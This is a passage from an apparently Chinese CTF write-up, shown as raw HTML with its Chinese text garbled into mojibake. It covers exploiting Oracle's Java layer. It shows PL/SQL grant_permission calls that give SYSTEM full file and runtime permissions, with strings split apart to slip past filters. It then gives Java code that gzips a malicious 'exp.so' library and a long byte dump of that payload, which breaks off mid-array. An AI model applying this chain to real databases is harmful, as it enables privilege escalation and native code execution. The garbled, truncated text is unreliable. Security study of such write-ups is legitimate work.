class="line"></span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨è¿‡ç¨‹"><span id="åˆ©ç”¨è¿‡ç¨‹"> åˆ©ç”¨è¿‡ç¨‹</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">begin</span><br><span class="line">dbms_java.grant_permission(<span class="string">&#x27;SYSTEM&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>, <span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>, <span class="string">&#x27;read,write,e&#x27;</span>||<span class="string">&#x27;xecute,del&#x27;</span>||<span class="string">&#x27;ete&#x27;</span>);</span><br><span class="line">end;</span><br><span class="line"></span><br><span class="line">begin</span><br><span class="line">dbms_java.grant_permission(<span class="string">&#x27;SYSTEM&#x27;</span>, <span class="string">&#x27;SYS:java.lang.Runt&#x27;</span>||<span class="string">&#x27;imePermission&#x27;</span>, <span class="string">&#x27;writeFileDescr&#x27;</span>||<span class="string">&#x27;iptor&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">end;</span><br><span class="line"></span><br><span class="line">begin</span><br><span class="line">dbms_java.grant_permission(<span class="string">&#x27;SYSTEM&#x27;</span>, <span class="string">&#x27;SYS:java.lang.Runt&#x27;</span>||<span class="string">&#x27;imePermission&#x27;</span>, <span class="string">&#x27;readFileDesc&#x27;</span>||<span class="string">&#x27;riptor&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆèµ‹æƒï¼Œè·å–è¯»å†™å’Œè®¿é—®çš„æƒé™</p><p>å‡†å¤‡å¥½ä¹‹å‰å†™çš„ so æ–‡ä»¶ï¼Œéœ€è¦å‹ç¼©ä¸€ä¸‹ï¼Œå› ä¸ºåŸå§‹æ•°æ®æœ‰ä¸€ä¸¤ä¸‡ï¼Œå‹ç¼©ä¸€ä¸‹åªæœ‰ä¸€ä¸¤åƒï¼Œæ•°æ®é‡å¤ªå¤§çš„è¯æ‰§è¡Œä¼šæŠ¥é”™ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">gzip_write</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] dataToCompress = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java\\bypassjava\\exp.so&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// åˆ›å»ºä¸€ä¸ªå­—èŠ‚æ•°ç»„è¾“å‡ºæµï¼Œç”¨äºä¿å­˜å‹ç¼©åçš„æ•°æ®</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åˆ›å»º GZIP å‹ç¼©è¾“å‡ºæµï¼Œå¹¶å°†å…¶è¿æ¥åˆ°å­—èŠ‚æ•°ç»„è¾“å‡ºæµ</span></span><br><span class="line">            <span class="keyword">try</span> (<span class="type">GZIPOutputStream</span> <span class="variable">gzipOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(byteArrayOutputStream)) &#123;</span><br><span class="line">                <span class="comment">// å°†æ•°æ®å†™å…¥ GZIP å‹ç¼©è¾“å‡ºæµ</span></span><br><span class="line">                gzipOutputStream.write(dataToCompress);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è·å–å‹ç¼©åçš„æ•°æ®</span></span><br><span class="line">            <span class="type">byte</span>[] compressedData = byteArrayOutputStream.toByteArray();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ‰“å°åŸå§‹æ•°æ®å’Œå‹ç¼©åçš„æ•°æ®é•¿åº¦</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">code_s</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;compressedData.length;i++)&#123;</span><br><span class="line">                code_s =  code_s + compressedData[i]+<span class="string">&quot;,&quot;</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            code_s = <span class="string">&quot;&#123;&quot;</span>+code_s+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">            System.out.println(code_s);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å®é™…åº”ç”¨ä¸­ï¼Œä½ å¯ä»¥å°†å‹ç¼©åçš„æ•°æ®å‘é€åˆ°ç½‘ç»œã€ä¿å­˜åˆ°æ–‡ä»¶ç­‰</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·å–å‹ç¼©çš„æ•°æ®</p><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/1703246901030.png" alt="1703246901030"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="number">31</span>,-<span class="number">117</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-<span class="number">19</span>,<span class="number">91</span>,<span class="number">95</span>,<span class="number">108</span>,<span class="number">20</span>,<span class="number">69</span>,<span class="number">24</span>,-<span class="number">97</span>,-<span class="number">67</span>,-<span class="number">74</span>,<span class="number">112</span>,<span class="number">7</span>,-<span class="number">91</span>,<span class="number">61</span>,<span class="number">16</span>,<span class="number">4</span>,-<span class="number">95</span>,-<span class="number">62</span>,<span class="number">97</span>,-<span class="number">64</span>,-<span class="number">128</span>,-<span class="number">46</span>,-<span class="number">91</span>,-<span class="number">128</span>,<span class="number">69</span>,<span class="number">20</span>,<span class="number">10</span>,<span class="number">109</span>,-<span class="number">81</span>,-<span class="number">41</span>,<span class="number">46</span>,-<span class="number">92</span>,<span class="number">45</span>,<span class="number">88</span>,-<span class="number">37</span>,<span class="number">7</span>,<span class="number">18</span>,<span class="number">116</span>,-<span class="number">39</span>,-<span class="number">34</span>,<span class="number">110</span>,-<span class="number">37</span>,<span class="number">35</span>,-<span class="number">9</span>,-<span class="number">89</span>,-<span class="number">71</span>,-<span class="number">37</span>,<span class="number">66</span>,-<span class="number">117</span>,-<span class="number">88</span>,<span class="number">21</span>,-<span class="number">94</span>,-<span class="number">46</span>,<span class="number">16</span>,<span class="number">18</span>,<span class="number">18</span>,<span class="number">99</span>,<span class="number">98</span>,-<span class="number">28</span>,<span class="number">5</span>,<span class="number">19</span>,<span class="number">99</span>,-<span class="number">28</span>,-<span class="number">119</span>,<span class="number">68</span>,<span class="number">94</span>,<span class="number">52</span>,-<span class="number">47</span>,<span class="number">88</span>,-<span class="number">62</span>,<span class="number">95</span>,<span class="number">69</span>,<span class="number">19</span>,<span class="number">76</span>,-<span class="number">116</span>,<span class="number">105</span>,<span class="number">76</span>,<span class="number">76</span>,-<span class="number">102</span>,<span class="number">40</span>,<span class="number">73</span>,<span class="number">73</span>,<span class="number">20</span>,<span class="number">33</span>,<span class="number">70</span>,<span class="number">83</span>,<span class="number">121</span>,-<span class="number">24</span>,<span class="number">58</span>,-<span class="number">77</span>,-<span class="number">5</span>,<span class="number">125</span>,-<span class="number">41</span>,-<span class="number">35</span>,<span class="number">97</span>,<span class="number">23</span>,-<span class="number">16</span>,<span class="number">65</span>,<span class="number">19</span>,-<span class="number">29</span>,-<span class="number">4</span>,-<span class="number">110</span>,-<span class="number">35</span>,-<span class="number">33</span>,<span class="number">126</span>,-<span class="number">33</span>,-<span class="number">52</span>,<span class="number">111</span>,<span class="number">102</span>,<span class="number">118</span>,<span class="number">118</span>,-<span class="number">82</span>,-<span class="number">77</span>,-<span class="number">41</span>,-<span class="number">5</span>,-<span class="number">66</span>,<span class="number">87</span>,<span class="number">19</span>,-<span class="number">83</span>,-<span class="number">51</span>,<span class="number">33</span>,<span class="number">73</span>,<span class="number">34</span>,-<span class="number">120</span>,<span class="number">18</span>,-<span class="number">78</span>,-<span class="number">107</span>,<span class="number">76</span>,<span class="number">91</span>,-<span class="number">124</span>,-<span class="number">44</span>,<span class="number">3</span>,-<span class="number">121</span>,<span class="number">107</span>,-<span class="number">35</span>,-<span class="number">66</span>,<span class="number">77</span>,<span class="number">36</span>,<span class="number">66</span>,-<span class="number">49</span>,<span class="number">85</span>,<span class="number">100</span>,-<span class="number">119</span>,<span class="number">93</span>,-<span class="number">73</span>,-<span class="number">108</span>,<span class="number">4</span>,-<span class="number">29</span>,-<span class="number">99</span>,<span class="number">82</span>,<span class="number">47</span>,-<span class="number">109</span>,-<span class="number">88</span>,<span class="number">67</span>,<span class="number">76</span>,<span class="number">87</span>,-<span class="number">26</span>,-<span class="number">78</span>,<span class="number">121</span>,-<span class="number">82</span>,-<span class="number">107</span>,-<span class="number">68</span>,-<span class="number">20</span>,-<span class="number">42</span>,-<span class="number">39</span>,<span class="number">77</span>,-<span class="number">59</span>,-<span class="number">64</span>,-<span class="number">49</span>,-<span class="number">15</span>,-<span class="number">5</span>,-<span class="number">60</span>,-<span class="number">53</span>,<span class="number">110</span>,-<span class="number">35</span>,<span class="number">12</span>,<span class="number">122</span>,<span class="number">76</span>,<span class="number">86</span>,<span class="number">59</span>,-<span class="number">10</span>,<span class="number">100</span>,-<span class="number">99</span>,-<span class="number">105</span>,<span class="number">23</span>,-<span class="number">123</span>,-<span class="number">96</span>,-<span class="number">103</span>,-<span class="number">112</span>,<span class="number">87</span>,<span class="number">23</span>,<span class="number">2</span>,<span class="number">93</span>,<span class="number">88</span>,<span class="number">118</span>,-<span class="number">20</span>,-<span class="number">16</span>,<span class="number">86</span>,<span class="number">47</span>,-<span class="number">113</span>,<span class="number">74</span>,<span class="number">94</span>,<span class="number">14</span>,-<span class="number">125</span>,-<span class="number">68</span>,<span class="number">20</span>,-<span class="number">114</span>,<span class="number">77</span>,-<span class="number">48</span>,<span class="number">30</span>,-<span class="number">49</span>,<span class="number">43</span>,-<span class="number">120</span>,-<span class="number">105</span>,<span class="number">113</span>,<span class="number">122</span>,<span class="number">118</span>,<span class="number">93</span>,<span class="number">55</span>,<span class="number">117</span>,<span class="number">91</span>,<span class="number">11</span>,-<span class="number">9</span>,-<span class="number">61</span>,<span class="number">115</span>,-<span class="number">112</span>,-<span class="number">18</span>,<span class="number">57</span>,-<span class="number">86</span>,-<span class="number">101</span>,<span class="number">65</span>,<span class="number">30</span>,<span class="number">28</span>,<span class="number">56</span>,-<span class="number">35</span>,<span class="number">29</span>,-<span class="number">48</span>,<span class="number">95</span>,-<span class="number">48</span>,-<span class="number">68</span>,-<span class="number">124</span>,<span class="number">67</span>,<span class="number">94</span>,-<span class="number">58</span>,-<span class="number">57</span>,-<span class="number">63</span>,<span class="number">52</span>,-<span class="number">13</span>,<span class="number">9</span>,<span class="number">91</span>,<span class="number">47</span>,-<span class="number">124</span>,-<span class="number">76</span>,-<span class="number">76</span>,<span class="number">119</span>,-<span class="number">111</span>,-<span class="number">9</span>,<span class="number">82</span>,<span class="number">23</span>,<span class="number">18</span>,-<span class="number">105</span>,-<span class="number">109</span>,<span class="number">103</span>,<span class="number">123</span>,<span class="number">83</span>,<span class="number">71</span>,-<span class="number">49</span>,-<span class="number">68</span>,<span class="number">116</span>,-<span class="number">13</span>,-<span class="number">21</span>,-<span class="number">49</span>,<span class="number">126</span>,-<span class="number">39</span>,-<span class="number">8</span>,-<span class="number">35</span>,-<span class="number">43</span>,<span class="number">29</span>,-<span class="number">84</span>,<span class="number">30</span>,-<span class="number">50</span>,<span class="number">31</span>,-<span class="number">50</span>,<span class="number">63</span>,-<span class="number">72</span>,-<span class="number">20</span>,-<span class="number">42</span>,-<span class="number">104</span>,<span class="number">61</span>,-<span class="number">44</span>,<span class="number">115</span>,<span class="number">116</span>,-<span class="number">10</span>,-<span class="number">3</span>,-<span class="number">58</span>,<span class="number">25</span>,-<span class="number">13</span>,-<span class="number">15</span>,-<span class="number">17</span>,-<span class="number">90</span>,-<span class="number">57</span>,<span class="number">60</span>,<span class="number">31</span>,-<span class="number">65</span>,<span class="number">20</span>,<span class="number">80</span>,<span class="number">127</span>,<span class="number">77</span>,-<span class="number">128</span>,-<span class="number">65</span>,-<span class="number">103</span>,<span class="number">30</span>,-<span class="number">113</span>,-<span class="number">7</span>,-<span class="number">8</span>,-<span class="number">69</span>,-<span class="number">20</span>,-<span class="number">10</span>,-<span class="number">53</span>,<span class="number">73</span>,<span class="number">100</span>,-<span class="number">82</span>,<span class="number">99</span>,<span class="number">47</span>,-<span class="number">57</span>,<span class="number">2</span>,<span class="number">85</span>,-<span class="number">19</span>,-<span class="number">51</span>,-<span class="number">28</span>,-<span class="number">78</span>,<span class="number">106</span>,-<span class="number">63</span>,-<span class="number">44</span>,-<span class="number">14</span>,-<span class="number">90</span>,-<span class="number">86</span>,<span class="number">18</span>,<span class="number">117</span>,<span class="number">123</span>,<span class="number">103</span>,-<span class="number">101</span>,-<span class="number">86</span>,<span class="number">27</span>,<span class="number">121</span>,-<span class="number">93</span>,<span class="number">55</span>,<span class="number">85</span>,<span class="number">48</span>,-<span class="number">115</span>,<span class="number">124</span>,<span class="number">103</span>,<span class="number">91</span>,<span class="number">60</span>,-<span class="number">99</span>,-<span class="number">53</span>,<span class="number">26</span>,-<span class="number">99</span>,<span class="number">90</span>,<span class="number">119</span>,-<span class="number">38</span>,<span class="number">112</span>,-<span class="number">54</span>,-<span class="number">4</span>,<span class="number">75</span>,-<span class="number">44</span>,-<span class="number">28</span>,-<span class="number">96</span>,-<span class="number">90</span>,-<span class="number">10</span>,-<span class="number">92</span>,-<span class="number">78</span>,<span class="number">90</span>,<span class="number">58</span>,<span class="number">117</span>,-<span class="number">48</span>,<span class="number">32</span>,-<span class="number">55</span>,-<span class="number">116</span>,<span class="number">78</span>,<span class="number">10</span>,<span class="number">67</span>,-<span class="number">76</span>,<span class="number">86</span>,-<span class="number">122</span>,-<span class="number">92</span>,<span class="number">83</span>,-<span class="number">35</span>,<span class="number">73</span>,-<span class="number">71</span>,-<span class="number">112</span>,-<span class="number">109</span>,<span class="number">55</span>,-<span class="number">110</span>,-<span class="number">106</span>,-<span class="number">42</span>,-<span class="number">19</span>,-<span class="number">115</span>,<span class="number">113</span>,<span class="number">117</span>,-<span class="number">67</span>,-<span class="number">68</span>,<span class="number">94</span>,-<span class="number">82</span>,-<span class="number">75</span>,-<span class="number">17</span>,<span class="number">43</span>,<span class="number">68</span>,<span class="number">15</span>,-<span class="number">25</span>,-<span class="number">20</span>,-<span class="number">36</span>,-<span class="number">89</span>,<span class="number">68</span>,-<span class="number">10</span>,-<span class="number">110</span>,-<span class="number">23</span>,-<span class="number">25</span>,<span class="number">56</span>,-<span class="number">80</span>,<span class="number">56</span>,<span class="number">21</span>,<span class="number">97</span>,-<span class="number">45</span>,-<span class="number">70</span>,<span class="number">15</span>,-<span class="number">20</span>,-<span class="number">30</span>,-<span class="number">13</span>,-<span class="number">61</span>,<span class="number">113</span>,-<span class="number">61</span>,<span class="number">125</span>,-<span class="number">112</span>,-<span class="number">83</span>,<span class="number">94</span>,-<span class="number">1</span>,<span class="number">40</span>,<span class="number">52</span>,<span class="number">16</span>,-<span class="number">82</span>,-<span class="number">9</span>,-<span class="number">6</span>,-<span class="number">47</span>,-<span class="number">66</span>,-<span class="number">78</span>,-<span class="number">51</span>,<span class="number">97</span>,<span class="number">124</span>,-<span class="number">122</span>,-<span class="number">120</span>,<span class="number">107</span>,<span class="number">46</span>,<span class="number">127</span>,-<span class="number">119</span>,-<span class="number">53</span>,<span class="number">63</span>,-<span class="number">26</span>,-<span class="number">14</span>,-<span class="number">69</span>,-<span class="number">1</span>,<span class="number">46</span>,-<span class="number">116</span>,-<span class="number">69</span>,-<span class="number">4</span>,<span class="number">101</span>,-<span class="number">18</span>,-<span class="number">119</span>,-<span class="number">122</span>,<span class="number">126</span>,<span class="number">102</span>,<span class="number">18</span>,<span class="number">88</span>,<span class="number">20</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,-<span class="number">1</span>,<span class="number">24</span>,-<span class="number">108</span>,<span class="number">35</span>,<span class="number">63</span>,-<span class="number">121</span>,-<span class="number">107</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">23</span>,-<span class="number">41</span>,-<span class="number">46</span>,-<span class="number">53</span>,-<span class="number">41</span>,<span class="number">71</span>,-<span class="number">51</span>,-<span class="number">112</span>,<span class="number">117</span>,<span class="number">77</span>,<span class="number">57</span>,<span class="number">114</span>,<span class="number">33</span>,<span class="number">124</span>,-<span class="number">66</span>,<span class="number">88</span>,<span class="number">110</span>,-<span class="number">43</span>,<span class="number">126</span>,<span class="number">73</span>,-<span class="number">117</span>,-<span class="number">84</span>,-<span class="number">107</span>,<span class="number">95</span>,-<span class="number">47</span>,<span class="number">115</span>,-<span class="number">27</span>,-<span class="number">78</span>,<span class="number">122</span>,<span class="number">122</span>,-<span class="number">59</span>,-<span class="number">20</span>,<span class="number">62</span>,<span class="number">86</span>,<span class="number">116</span>,<span class="number">99</span>,-<span class="number">36</span>,-<span class="number">94</span>,<span class="number">88</span>,-<span class="number">7</span>,<span class="number">46</span>,-<span class="number">75</span>,<span class="number">123</span>,<span class="number">78</span>,<span class="number">20</span>,-<span class="number">37</span>,<span class="number">59</span>,<span class="number">94</span>,-<span class="number">9</span>,<span class="number">9</span>,<span class="number">107</span>,-<span class="number">21</span>,<span class="number">120</span>,-<span class="number">39</span>,<span class="number">71</span>,-<span class="number">116</span>,-<span class="number">98</span>,-<span class="number">103</span>,<span class="number">52</span>,<span class="number">23</span>,-<span class="number">48</span>,-<span class="number">26</span>,<span class="number">95</span>,-<span class="number">124</span>,-<span class="number">26</span>,<span class="number">35</span>,-<span class="number">42</span>,<span class="number">120</span>,-<span class="number">27</span>,-<span class="number">78</span>,<span class="number">97</span>,<span class="number">86</span>,-<span class="number">17</span>,<span class="number">60</span>,<span class="number">48</span>,-<span class="number">83</span>,<span class="number">63</span>,<span class="number">98</span>,-<span class="number">41</span>,-<span class="number">81</span>,<span class="number">61</span>,-<span class="number">52</span>,<span class="number">104</span>,-<span class="number">11</span>,-<span class="number">108</span>,<span class="number">50</span>,<span class="number">114</span>,<span class="number">75</span>,<span class="number">57</span>,<span class="number">119</span>,<span class="number">115</span>,-<span class="number">101</span>,<span class="number">114</span>,<span class="number">110</span>,-<span class="number">78</span>,<span class="number">68</span>,-<span class="number">111</span>,<span class="number">46</span>,<span class="number">41</span>,-<span class="number">33</span>,<span class="number">76</span>,-<span class="number">103</span>,-<span class="number">13</span>,<span class="number">105</span>,<span class="number">3</span>,-<span class="number">43</span>,-<span class="number">48</span>,<span class="number">64</span>,-<span class="number">40</span>,<span class="number">26</span>,-<span class="number">17</span>,-<span class="number">87</span>,<span class="number">92</span>,-<span class="number">42</span>,<span class="number">52</span>,-<span class="number">83</span>,-<span class="number">1</span>,-<span class="number">83</span>,<span class="number">114</span>,-<span class="number">23</span>,-<span class="number">99</span>,-<span class="number">31</span>,-<span class="number">70</span>,<span class="number">4</span>,<span class="number">45</span>,<span class="number">38</span>,<span class="number">3</span>,<span class="number">79</span>,<span class="number">118</span>,<span class="number">41</span>,<span class="number">71</span>,-<span class="number">22</span>,<span class="number">102</span>,-<span class="number">79</span>,<span class="number">75</span>,<span class="number">101</span>,-<span class="number">28</span>,-<span class="number">70</span>,<span class="number">89</span>,-<span class="number">82</span>,<span class="number">28</span>,-<span class="number">85</span>,<span class="number">123</span>,-<span class="number">100</span>,<span class="number">26</span>,<span class="number">19</span>,-<span class="number">69</span>,-<span class="number">23</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">116</span>,<span class="number">122</span>,-<span class="number">70</span>,<span class="number">84</span>,-<span class="number">10</span>,<span class="number">40</span>,-<span class="number">75</span>,-<span class="number">91</span>,<span class="number">23</span>,-<span class="number">88</span>,-<span class="number">42</span>,-<span class="number">93</span>,-<span class="number">65</span>,<span class="number">113</span>,-<span class="number">128</span>,<span class="number">22</span>,<span class="number">118</span>,<span class="number">81</span>,<span class="number">13</span>,-<span class="number">99</span>,-<span class="number">116</span>,-<span class="number">88</span>,<span class="number">50</span>,-<span class="number">14</span>,-<span class="number">14</span>,-<span class="number">92</span>,<span class="number">114</span>,<span class="number">44</span>,<span class="number">49</span>,-<span class="number">87</span>,-<span class="number">116</span>,<span class="number">92</span>,-<span class="number">98</span>,-<span class="number">88</span>,-<span class="number">92</span>,<span class="number">126</span>,<span class="number">122</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">21</span>,-<span class="number">124</span>,<span class="number">124</span>,<span class="number">113</span>,<span class="number">30</span>,-<span class="number">26</span>,-<span class="number">54</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,-<span class="number">1</span>,<span class="number">13</span>,-<span class="number">84</span>,-<span class="number">93</span>,-<span class="number">121</span>,-<span class="number">76</span>,-<span class="number">92</span>,<span class="number">100</span>,<span class="number">115</span>,-<span class="number">116</span>,<span class="number">56</span>,-<span class="number">65</span>,-<span class="number">29</span>,<span class="number">85</span>,-<span class="number">35</span>,-<span class="number">78</span>,-<span class="number">84</span>,<span class="number">45</span>,-<span class="number">108</span>,-<span class="number">73</span>,<span class="number">80</span>,-<span class="number">42</span>,<span class="number">41</span>,-<span class="number">105</span>,-<span class="number">35</span>,-<span class="number">74</span>,-<span class="number">84</span>,<span class="number">67</span>,-<span class="number">60</span>,-<span class="number">7</span>,-<span class="number">83</span>,-<span class="number">105</span>,<span class="number">65</span>,<span class="number">58</span>,-<span class="number">40</span>,<span class="number">65</span>,-<span class="number">92</span>,-<span class="number">63</span>,-<span class="number">88</span>,-<span class="number">76</span>,-<span class="number">92</span>,<span class="number">124</span>,<span class="number">102</span>,-<span class="number">8</span>,-<span class="number">124</span>,-<span class="number">28</span>,-<span class="number">4</span>,<span class="number">14</span>,<span class="number">93</span>,<span class="number">69</span>,-<span class="number">113</span>,-<span class="number">79</span>,<span class="number">95</span>,<span class="number">45</span>,-<span class="number">117</span>,-<span class="number">75</span>,<span class="number">65</span>,<span class="number">42</span>,-<span class="number">94</span>,-<span class="number">51</span>,<span class="number">21</span>,-<span class="number">117</span>,<span class="number">118</span>,<span class="number">84</span>,-<span class="number">50</span>,<span class="number">62</span>,<span class="number">16</span>,<span class="number">30</span>,<span class="number">38</span>,-<span class="number">37</span>,<span class="number">22</span>,<span class="number">111</span>,<span class="number">126</span>,<span class="number">98</span>,-<span class="number">61</span>,<span class="number">10</span>,-<span class="number">5</span>,-<span class="number">25</span>,<span class="number">85</span>,-<span class="number">90</span>,-<span class="number">89</span>,<span class="number">95</span>,-<span class="number">37</span>,-<span class="number">55</span>,<span class="number">53</span>,<span class="number">90</span>,<span class="number">47</span>,-<span class="number">20</span>,-<span class="number">22</span>,-<span class="number">97</span>,<span class="number">105</span>,-<span class="number">9</span>,-<span class="number">48</span>,-<span class="number">29</span>,<span class="number">53</span>,-<span class="number">38</span>,-<span class="number">97</span>,-<span class="number">3</span>,<span class="number">27</span>,<span class="number">107</span>,<span class="number">67</span>,<span class="number">69</span>,-<span class="number">12</span>,-<span class="number">115</span>,<span class="number">80</span>,<span class="number">124</span>,-<span class="number">50</span>,-<span class="number">116</span>,<span class="number">61</span>,-<span class="number">76</span>,-<span class="number">125</span>,<span class="number">127</span>,-<span class="number">6</span>,-<span class="number">26</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,-<span class="number">2</span>,<span class="number">15</span>,-<span class="number">128</span>,<span class="number">120</span>,-<span class="number">48</span>,<span class="number">81</span>,<span class="number">87</span>,<span class="number">124</span>,<span class="number">52</span>,-<span class="number">61</span>,<span class="number">94</span>,-<span class="number">32</span>,<span class="number">114</span>,-<span class="number">84</span>,<span class="number">7</span>,-<span class="number">27</span>,<span class="number">115</span>,-<span class="number">64</span>,<span class="number">92</span>,<span class="number">3</span>,-<span class="number">70</span>,<span class="number">71</span>,-<span class="number">64</span>,-<span class="number">58</span>,<span class="number">56</span>,-<span class="number">45</span>,<span class="number">37</span>,<span class="number">96</span>,-<span class="number">29</span>,<span class="number">119</span>,-<span class="number">74</span>,-<span class="number">59</span>,-<span class="number">88</span>,-<span class="number">121</span>,<span class="number">120</span>,-<span class="number">45</span>,<span class="number">42</span>,-<span class="number">82</span>,-<span class="number">4</span>,-<span class="number">9</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">103</span>,-<span class="number">9</span>,<span class="number">7</span>,<span class="number">65</span>,-<span class="number">97</span>,<span class="number">24</span>,<span class="number">19</span>,<span class="number">90</span>,<span class="number">3</span>,-<span class="number">63</span>,-<span class="number">92</span>,<span class="number">24</span>,-<span class="number">53</span>,<span class="number">124</span>,<span class="number">20</span>,-<span class="number">54</span>,<span class="number">103</span>,-<span class="number">127</span>,-<span class="number">67</span>,<span class="number">31</span>,<span class="number">24</span>,-<span class="number">125</span>,-<span class="number">122</span>,<span class="number">23</span>,<span class="number">1</span>,<span class="number">99</span>,<span class="number">12</span>,-<span class="number">22</span>,<span class="number">4</span>,-<span class="number">60</span>,-<span class="number">103</span>,-<span class="number">122</span>,-<span class="number">72</span>,<span class="number">114</span>,-<span class="number">4</span>,-<span class="number">2</span>,<span class="number">58</span>,<span class="number">19</span>,<span class="number">120</span>,<span class="number">33</span>,-<span class="number">16</span>,<span class="number">112</span>,-<span class="number">87</span>,-<span class="number">41</span>,<span class="number">63</span>,<span class="number">86</span>,-<span class="number">30</span>,<span class="number">29</span>,-<span class="number">25</span>,-<span class="number">121</span>,-<span class="number">64</span>,<span class="number">17</span>,-<span class="number">82</span>,-<span class="number">67</span>,<span class="number">41</span>,-<span class="number">53</span>,<span class="number">25</span>,-<span class="number">1</span>,-<span class="number">57</span>,<span class="number">80</span>,-<span class="number">33</span>,<span class="number">2</span>,<span class="number">27</span>,-<span class="number">25</span>,-<span class="number">15</span>,<span class="number">22</span>,-<span class="number">40</span>,<span class="number">31</span>,<span class="number">64</span>,-<span class="number">7</span>,-<span class="number">97</span>,<span class="number">96</span>,-<span class="number">69</span>,<span class="number">99</span>,<span class="number">101</span>,-<span class="number">1</span>,<span class="number">77</span>,<span class="number">96</span>,-<span class="number">68</span>,<span class="number">58</span>,-<span class="number">113</span>,-<span class="number">115</span>,<span class="number">92</span>,-<span class="number">4</span>,<span class="number">111</span>,<span class="number">75</span>,<span class="number">60</span>,-<span class="number">2</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">85</span>,-<span class="number">109</span>,-<span class="number">47</span>,-<span class="number">99</span>,-<span class="number">46</span>,-<span class="number">78</span>,-<span class="number">79</span>,<span class="number">117</span>,-<span class="number">21</span>,-<span class="number">28</span>,<span class="number">13</span>,<span class="number">114</span>,<span class="number">77</span>,<span class="number">117</span>,-<span 